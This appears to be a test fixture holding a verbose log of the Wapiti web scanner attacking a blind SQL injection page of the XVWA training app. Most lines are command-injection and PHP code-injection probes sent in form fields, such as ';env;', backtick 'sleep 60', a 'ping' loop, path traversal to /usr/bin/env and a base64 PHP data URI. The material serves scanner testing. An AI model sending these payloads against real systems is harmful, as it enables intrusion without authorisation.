+2024-03-20 15:24:48.163 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=5p5lyd for results, please wait...
+2024-03-20 15:24:50.243 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 15:24:50.259 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:50.273 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:50.277 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%3Benv%3B&search=
+2024-03-20 15:24:50.292 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%7Cenv%7C&search=
+2024-03-20 15:24:50.303 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=a%3Benv%3B&search=
+2024-03-20 15:24:50.314 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=a%3Benv%3B&search=
+2024-03-20 15:24:50.324 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&search=
+2024-03-20 15:24:50.336 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%3Benv%3B&search=
+2024-03-20 15:24:50.350 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%0Aenv%3B&search=
+2024-03-20 15:24:50.360 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%26set%26&search=
+2024-03-20 15:24:50.370 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=set&search=
+2024-03-20 15:24:50.380 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=env&search=
+2024-03-20 15:24:50.390 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%2Fe%00&search=
+2024-03-20 15:24:50.401 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:50.411 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:50.421 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:50.431 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:50.441 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:50.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:50.468 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:50.481 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:50.496 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:50.510 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:50.523 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:50.533 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:50.544 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&search=
+2024-03-20 15:24:50.554 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=a%60%29%60&search=
+2024-03-20 15:24:50.565 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=a%60sleep%2060%60&search=
+2024-03-20 15:24:50.575 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=a%3Bsleep%2060%3B&search=
+2024-03-20 15:24:50.585 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=a%7Csleep%2060%3B&search=
+2024-03-20 15:24:50.595 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%26ping%20-n%2025%20127.0.0.1%26&search=
+2024-03-20 15:24:50.607 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%3Benv%3B
+2024-03-20 15:24:50.618 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%7Cenv%7C
+2024-03-20 15:24:50.629 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=a%3Benv%3B
+2024-03-20 15:24:50.639 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=a%3Benv%3B
+2024-03-20 15:24:50.649 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 15:24:50.658 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%3Benv%3B
+2024-03-20 15:24:50.668 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%0Aenv%3B
+2024-03-20 15:24:50.678 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%26set%26
+2024-03-20 15:24:50.693 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=set
+2024-03-20 15:24:50.703 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=env
+2024-03-20 15:24:50.715 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2Fe%00
+2024-03-20 15:24:50.724 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:50.733 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:50.741 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:50.750 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:50.759 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:50.768 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:50.778 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:50.788 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:50.798 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:50.807 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:50.820 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:50.833 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:50.846 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 15:24:50.856 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=a%60%29%60
+2024-03-20 15:24:50.867 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=a%60sleep%2060%60
+2024-03-20 15:24:50.878 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=a%3Bsleep%2060%3B
+2024-03-20 15:24:50.886 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=a%7Csleep%2060%3B
+2024-03-20 15:24:50.895 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 15:24:50.911 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:50.913 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%3Benv%3B&item=10
+2024-03-20 15:24:50.921 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%7Cenv%7C&item=10
+2024-03-20 15:24:50.931 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=a%3Benv%3B&item=10
+2024-03-20 15:24:50.939 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=a%3Benv%3B&item=10
+2024-03-20 15:24:50.949 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&item=10
+2024-03-20 15:24:50.956 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%3Benv%3B&item=10
+2024-03-20 15:24:50.965 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%0Aenv%3B&item=10
+2024-03-20 15:24:50.973 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%26set%26&item=10
+2024-03-20 15:24:50.983 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=set&item=10
+2024-03-20 15:24:50.991 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=env&item=10
+2024-03-20 15:24:51.000 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%2Fe%00&item=10
+2024-03-20 15:24:51.009 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:51.018 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:51.027 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:51.037 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:51.046 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:51.055 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:51.065 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:51.078 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:51.089 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:51.099 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:51.110 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:51.122 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:51.133 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&item=10
+2024-03-20 15:24:51.141 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=a%60%29%60&item=10
+2024-03-20 15:24:51.152 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=a%60sleep%2060%60&item=10
+2024-03-20 15:24:51.164 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=a%3Bsleep%2060%3B&item=10
+2024-03-20 15:24:51.176 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=a%7Csleep%2060%3B&item=10
+2024-03-20 15:24:51.184 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%26ping%20-n%2025%20127.0.0.1%26&item=10
+2024-03-20 15:24:51.195 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%3Benv%3B
+2024-03-20 15:24:51.206 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%7Cenv%7C
+2024-03-20 15:24:51.218 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=a%3Benv%3B
+2024-03-20 15:24:51.231 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=a%3Benv%3B
+2024-03-20 15:24:51.240 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 15:24:51.250 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%3Benv%3B
+2024-03-20 15:24:51.259 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%0Aenv%3B
+2024-03-20 15:24:51.268 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%26set%26
+2024-03-20 15:24:51.279 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=set
+2024-03-20 15:24:51.288 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=env
+2024-03-20 15:24:51.298 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%2Fe%00
+2024-03-20 15:24:51.307 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:51.316 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:51.326 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:51.336 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:51.348 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:51.359 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:51.372 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:51.385 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:51.397 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:51.406 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:51.415 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:51.424 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:51.434 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 15:24:51.445 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=a%60%29%60
+2024-03-20 15:24:51.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=a%60sleep%2060%60
+2024-03-20 15:24:51.466 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=a%3Bsleep%2060%3B
+2024-03-20 15:24:51.480 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=a%7Csleep%2060%3B
+2024-03-20 15:24:51.493 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 15:24:51.521 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 15:24:51.535 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:51.546 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:51.582 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:51.622 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 15:24:51.637 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:51.650 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 15:24:51.701 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 15:24:51.716 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:51.740 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:51.763 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:51.826 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
